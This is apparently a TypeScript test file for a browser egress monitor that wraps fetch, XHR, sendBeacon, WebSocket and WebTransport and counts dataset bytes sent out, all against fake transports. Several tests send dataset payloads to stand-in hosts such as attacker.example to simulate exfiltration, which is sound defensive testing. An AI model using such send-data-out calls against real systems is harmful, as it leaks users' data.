import { describe, expect, it } from "vitest";
import { armEgressMonitoring, EXPECTED_TRANSPORTS, type EgressScope } from "./egress";
import { createCustodyKernel } from "./kernel";

/**
 * Egress interception (ticket 28; grilling 24): all five transports wrap at
 * boot, a dataset-payload send is counted, application-shell traffic is
 * not, and WebTransport is feature-detected. Every case runs against
 * injected fake transports — no real network exists in these tests.
 */

function fakeScope() {
  const scope = {
    fetchCalls: [] as unknown[][],
    sent: [] as unknown[],
    beaconed: [] as unknown[],
    websocketSent: [] as unknown[],
    datagramSent: [] as unknown[],
    fetch(_input: unknown, init?: { body?: unknown }): Promise<unknown> {
      scope.fetchCalls.push([_input, init]);
      return Promise.resolve({});
    },
    XMLHttpRequest: class FakeXHR {
      send(body?: unknown): void {
        scope.sent.push(body);
      }
    },
    navigator: {
      sendBeacon(_url: unknown, data?: unknown): boolean {
        scope.beaconed.push(data);
        return true;
      },
    },
    WebSocket: class FakeWebSocket {
      constructor(_url: unknown) {}
      send(data?: unknown): void {
        scope.websocketSent.push(data);
      }
    },
  };
  return scope;
}

describe("arming covers all present transports", () => {
  it("wraps fetch, XMLHttpRequest, sendBeacon, and WebSocket; WebTransport only when present", () => {
    const scope = fakeScope();
    const kernel = createCustodyKernel();
    const monitor = armEgressMonitoring(scope as unknown as EgressScope, kernel);
    expect(monitor.monitoredTransports).toEqual(["fetch", "XMLHttpRequest", "sendBeacon", "WebSocket"]);
    expect(kernel.evidence({ kind: "workspace", id: "ws" }).monitoredTransports).toEqual(monitor.monitoredTransports);
    monitor.disarm();
  });

  it("wraps WebTransport where the API exists (feature-detected)", () => {
    const scope = fakeScope();
    class FakeWebTransport {
      constructor(_url: unknown) {}
      datagram = {
        writable: {
          getWriter() {
            return {
              write(data: unknown): Promise<void> {
                scope.datagramSent.push(data);
                return Promise.resolve();
              },
            };
          },
        },
      };
    }
    (scope as { WebTransport?: unknown }).WebTransport = FakeWebTransport;
    const kernel = createCustodyKernel();
    const monitor = armEgressMonitoring(scope as unknown as EgressScope, kernel);
    expect(monitor.monitoredTransports).toEqual(["fetch", "XMLHttpRequest", "sendBeacon", "WebSocket", "WebTransport"]);
    expect(monitor.monitoredTransports).toEqual([...EXPECTED_TRANSPORTS]);
    monitor.disarm();
  });

  it("disarm restores the original transports", () => {
    const scope = fakeScope();
    const originalFetch = scope.fetch;
    const kernel = createCustodyKernel();
    const monitor = armEgressMonitoring(scope as unknown as EgressScope, kernel);
    expect(scope.fetch).not.toBe(originalFetch);
    monitor.disarm();
    expect(scope.fetch).toBe(originalFetch);
    expect(kernel.evidence({ kind: "workspace", id: "ws" }).monitoredTransports).toEqual([]);
  });
});

describe("dataset-byte accounting", () => {
  it("counts a dataset-payload fetch (the injected fake transport proves the path)", () => {
    const scope = fakeScope();
    const kernel = createCustodyKernel();
    const monitor = armEgressMonitoring(scope as unknown as EgressScope, kernel);
    const payload = { values: { tickets: [1, 2, 3] } };
    kernel.noteDatasetPayload(payload);

    void scope.fetch("https://attacker.example/upload", { body: payload });
    expect(kernel.evidence({ kind: "workspace", id: "ws" }).datasetBytesUploaded).toBeGreaterThan(0);
    monitor.disarm();
  });

  it("application-shell traffic stays outside the accounting", () => {
    const scope = fakeScope();
    const kernel = createCustodyKernel();
    const monitor = armEgressMonitoring(scope as unknown as EgressScope, kernel);
    kernel.noteDatasetPayload({ values: { tickets: [1] } });

    void scope.fetch("/context", { body: JSON.stringify({ scope: "summary" }) });
    scope.navigator.sendBeacon("/telemetry", "shell-ping");
    const xhr = new scope.XMLHttpRequest();
    xhr.send("unrelated shell bytes");

    expect(kernel.evidence({ kind: "workspace", id: "ws" }).datasetBytesUploaded).toBe(0);
    // The sends still went through — interception never blocks the app.
    expect(scope.beaconed).toEqual(["shell-ping"]);
    expect(scope.sent).toEqual(["unrelated shell bytes"]);
    monitor.disarm();
  });

  it("counts dataset bytes crossing XHR, sendBeacon, WebSocket, and WebTransport datagrams", () => {
    const scope = fakeScope();
    class FakeWebTransport {
      constructor(_url: unknown) {}
      datagram = {
        writable: {
          getWriter() {
            return {
              write(data: unknown): Promise<void> {
                scope.datagramSent.push(data);
                return Promise.resolve();
              },
            };
          },
        },
      };
    }
    (scope as { WebTransport?: unknown }).WebTransport = FakeWebTransport;
    const kernel = createCustodyKernel();
    const monitor = armEgressMonitoring(scope as unknown as EgressScope, kernel);
    const payload = { values: { mrr: [182400] } };
    kernel.noteDatasetPayload(payload);

    new scope.XMLHttpRequest().send(payload);
    scope.navigator.sendBeacon("https://attacker.example/b", payload);
    new scope.WebSocket("wss://attacker.example/ws").send(payload);
    const wrapped = (scope as unknown as { WebTransport: new (url: string) => FakeWebTransport }).WebTransport;
    const transport = new wrapped("https://attacker.example/wt");
    void transport.datagram.writable.getWriter().write(payload);

    // One send per transport, each accounted (payload counted 4 times).
    expect(kernel.evidence({ kind: "workspace", id: "ws" }).datasetBytesUploaded).toBe(
      4 * kernel.datasetPayloadBytes(payload),
    );
    expect(scope.sent).toEqual([payload]);
    expect(scope.beaconed).toEqual([payload]);
    expect(scope.websocketSent).toEqual([payload]);
    expect(scope.datagramSent).toEqual([payload]);
    monitor.disarm();
  });
});
